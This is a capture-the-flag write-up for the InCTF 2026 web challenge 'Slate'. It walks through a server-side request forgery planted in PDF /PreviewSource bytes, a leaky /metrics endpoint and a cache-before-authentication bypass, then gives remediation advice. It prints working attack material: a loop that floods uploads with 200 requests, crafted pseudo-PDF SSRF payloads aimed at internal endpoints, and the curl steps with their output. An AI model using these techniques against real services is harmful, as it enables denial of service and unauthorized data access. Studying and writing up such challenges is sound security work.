---
title: Slate
ctf: InCTF
category: Web
date: 2026-06-20
tags:
  - Web Exploitation
summary: Exploited a fast-mode SSRF to access an internal service, leaked the admin document ID through an exposed metrics endpoint, and abused a cache-before-auth vulnerability to retrieve the flag.
---

# Slate - Writeup

| Field        | Value            |
| ------------ | ---------------- |
| **CTF**      | InCTF 2026       |
| **Category** | Web Exploitation |

## Challenge Description

> Reads everything carefully — until it's in a hurry

## Overview

Slate is a web application that accepts PDF uploads and generates a text preview of their contents. The service has two modes of operation: a standard mode that queues jobs for worker processes, and a degraded "fast mode" that kicks in when too many jobs have timed out or failed. The vulnerability chain exploits the fast mode to perform an unauthenticated Server-Side Request Forgery (SSRF), then abuses a broken access control in the internal service to extract the flag without ever having the required secret header.

---

## Application Architecture

Reading through the source code revealed a two-service architecture running inside the same container.

**Frontend service (port 9010, public)**

Accepts PDF uploads via `/upload`. If the queue is healthy, it enqueues the job and returns a `job_id`. If fast mode is active, it skips the queue entirely and calls `fastpath.fast_preview(pdf_bytes)` instead, returning the result synchronously.

**Internal service (port 9015, loopback only)**

A separate Flask app bound to `127.0.0.1` only, not exposed to the internet. It handles rendering requests at `/render/<doc_id>` and serves metrics at `/metrics`.

**Admin bot**

A background thread that polls `http://127.0.0.1:9015/render/<ADMIN_DOC_ID>` every ten seconds, passing the required secret header `X-Internal-Role`. Its purpose is to pre-populate the render cache with the admin document content, which contains the flag.

---

## Vulnerability 1: Fast Mode SSRF via PDF PreviewSource

`fastpath.py` contains the following logic:

```python
def fast_preview(pdf_bytes):
    url = pdfutil.extract_preview_source(pdf_bytes)
    if not url:
        return "fast-preview: document has no /PreviewSource"
    try:
        response = requests.get(url, timeout=5)
        return f"fast-preview fetched {url} [{response.status_code}]\n\n{response.text}"
    except Exception as exc:
        return f"fast-preview fetch error for {url}: {exc}"
```

`pdfutil.extract_preview_source` extracts the URL using a raw regex search against the PDF bytes:

```python
_PREVIEW_SOURCE_RE = re.compile(rb"/PreviewSource\s*\(\s*(https?://[^)\s]+)\s*\)")

def extract_preview_source(pdf_bytes):
    match = _PREVIEW_SOURCE_RE.search(pdf_bytes)
    return match.group(1).decode("latin-1") if match else None
```

There are two important details here. First, the extraction uses a raw byte-level regex against the entire PDF, not a proper PDF parser. This means we do not need to craft a valid, parseable PDF with a correct cross-reference table. We just need the literal bytes `/PreviewSource (http://...)` to appear anywhere in the file we upload. Second, the URL is fetched with no restrictions, no allowlist, and no blocklist. The server will make an HTTP request to any URL we supply, including loopback addresses like `http://127.0.0.1:9015/`.

**Triggering fast mode**

Fast mode activates when the `runaways` counter (count of timed-out or killed jobs) reaches the `RUNAWAY_THRESHOLD` of 4. To trigger this, we flooded the upload endpoint with 200 concurrent requests using a bash loop:

```bash
for i in {1..200}; do
  curl -s -F "file=@test.pdf" http://127.0.0.1:9010/upload &
done
wait
```

Sending this many jobs simultaneously overwhelms the worker pool. Each worker has a `JOB_TIMEOUT` of 5 seconds and a `JOB_MEM_LIMIT_MB` of 96 MB. Jobs that exceed either limit are killed by the sandbox, and every killed job increments the `runaways` counter. Once `runaways` reaches 4, `fast_mode` flips to `true` and stays there for the lifetime of the process.

After the flood completed, checking `/status` confirmed fast mode was now active:

```json
{ "fast_mode": true, "queued": 0, "runaways": 4, "workers": 3 }
```

All subsequent uploads would now be handled by `fastpath.fast_preview` instead of the safe sandboxed worker path.

---

## Vulnerability 2: Auth Bypass via Cache-Before-Auth Race

`internal.py` implements the `/render/<doc_id>` route as follows:

```python
@internal_app.route("/render/<path:doc_id>")
def render(doc_id):
    key = cache.key_for(request.path)
    cached = cache.get(key)
    if cached is not None:
        _recent.append(doc_id)
        return Response(cached, mimetype="text/plain", headers={"X-Cache": "HIT"})
    if request.headers.get(config.INTERNAL_ROLE_HEADER) != config.INTERNAL_ROLE_VALUE:
        return Response(
            "forbidden\n", status=403, mimetype="text/plain",
            headers={"X-Cache": "MISS"},
        )
    body = _render(doc_id)
    cache.set(key, body)
    _recent.append(doc_id)
    return Response(body, mimetype="text/plain", headers={"X-Cache": "MISS"})
```

The order of operations here is the critical flaw. The route checks the cache first, and returns the cached content immediately if a hit is found, before ever checking the `X-Internal-Role` header. The authentication check only happens on a cache miss.

The admin bot continuously requests `/render/<ADMIN_DOC_ID>` with the valid secret header, populating and refreshing the cache every ten seconds. Any subsequent request to that exact path, with or without the secret header, will receive a cache hit and get the flag back without any authentication.

---

## Vulnerability 3: Unauthenticated Metrics Endpoint Leaks ADMIN_DOC_ID

`ADMIN_DOC_ID` is generated at startup using `secrets.token_hex(8)` and prefixed with `export-`. It is not predictable. However, `internal.py` also exposes a `/metrics` endpoint:

```python
@internal_app.route("/metrics")
def metrics():
    body = "recent_renders:\n" + "".join(f"  {d}\n" for d in _recent)
    return Response(body, mimetype="text/plain")
```

This endpoint has no authentication check at all. It returns the last ten `doc_id` values that have been rendered. Since the admin bot polls `/render/<ADMIN_DOC_ID>` every ten seconds, the `_recent` deque will be filled with the real `ADMIN_DOC_ID`. Fetching `/metrics` via SSRF leaks the exact doc ID we need to complete the attack.

---

## Exploit Steps

### Step 1: Confirm fast mode is active

```bash
curl -s http://127.0.0.1:9010/status
```

Response:

```json
{ "fast_mode": true, "queued": 0, "runaways": 4, "workers": 3 }
```

Fast mode was already active. The application will now process uploads via `fastpath.fast_preview` instead of the safe sandboxed worker.

---

### Step 2: Craft an SSRF payload targeting /metrics

Because `extract_preview_source` does a raw regex search, we do not need a valid PDF. We just need the literal byte pattern to appear in the uploaded file. A minimal pseudo-PDF with the right bytes is enough:

```
%PDF-1.4
1 0 obj
<< /Type /Catalog /PreviewSource (http://127.0.0.1:9015/metrics) >>
endobj
trailer
<< /Root 1 0 R >>
%%EOF
```

Save this as `ssrf_metrics.pdf`.

---

### Step 3: Upload the metrics payload and leak ADMIN_DOC_ID

```bash
curl -s -F "file=@ssrf_metrics.pdf" http://127.0.0.1:9010/upload
```

Response:

```json
{
  "mode": "fast",
  "result": "fast-preview fetched http://127.0.0.1:9015/metrics [200]\n\nrecent_renders:\n  export-379fc9e1d2799d2b\n  export-379fc9e1d2799d2b\n  ..."
}
```

The `ADMIN_DOC_ID` is `export-379fc9e1d2799d2b`.

---

### Step 4: Craft an SSRF payload targeting /render/<ADMIN_DOC_ID>

```
%PDF-1.4
1 0 obj
<< /Type /Catalog /PreviewSource (http://127.0.0.1:9015/render/export-379fc9e1d2799d2b) >>
endobj
trailer
<< /Root 1 0 R >>
%%EOF
```

Save this as `ssrf_render.pdf`.

---

### Step 5: Upload the render payload and retrieve the flag

```bash
curl -s -F "file=@ssrf_render.pdf" http://127.0.0.1:9010/upload
```

Response:

```json
{
  "mode": "fast",
  "result": "fast-preview fetched http://127.0.0.1:9015/render/export-379fc9e1d2799d2b [200]\n\nAdmin export\n\ninctf{uVi8T8RvUfsr6ASa14TxJw==}\n"
}
```

The cache serves the pre-populated admin document without checking our headers. The flag is returned in plaintext.

---

## Why Note-Taking in the Fast Path Matters

It is worth understanding why the fast-path SSRF exists at all. The `CACHE_DECEPTION` config flag hints at a deliberately unstable and insecure design: when the system is overwhelmed, security is traded for availability. The standard sandboxed worker uses `pypdf` inside a memory-limited subprocess with a timeout, which is why large or malformed PDFs cause `runaways`. The fast preview path is designed to still serve something useful when the system is degraded, but in doing so it blindly fetches and returns the content of any URL embedded in the uploaded file. That decision, combined with the internal service being reachable via loopback from within the same container, creates the full SSRF primitive.

---

## Vulnerability Summary

| #   | Vulnerability                                            | Location      | Impact                                                |
| --- | -------------------------------------------------------- | ------------- | ----------------------------------------------------- |
| 1   | SSRF via unvalidated PreviewSource URL fetch             | `fastpath.py` | Make arbitrary HTTP requests from the server          |
| 2   | Unauthenticated /metrics endpoint leaks internal doc IDs | `internal.py` | Discover the randomized ADMIN_DOC_ID                  |
| 3   | Cache checked before authentication on /render           | `internal.py` | Retrieve admin-only content without the secret header |

---

## Remediation

**Fix the SSRF:** Validate that any URL extracted from a PDF is not on the loopback interface or any internal RFC 1918 range before fetching it. Alternatively, never fetch user-supplied URLs server-side, and use a dedicated external fetch proxy with a strict allowlist.

**Fix the auth bypass:** Move the authentication check before the cache lookup. An unauthenticated request should never result in a cache hit returning privileged content.

**Fix the metrics leak:** Add authentication to the `/metrics` endpoint, or at minimum do not log privileged doc IDs to an unauthenticated endpoint.

**Fix fast mode privilege:** The fast preview path should be subject to the same or stricter controls as the standard path, not weaker ones. A degraded system is still a production system.

---

## Flag

```
inctf{uVi8T8RvUfsr6ASa14TxJw==}
```

PWN by **W4RR1OR**
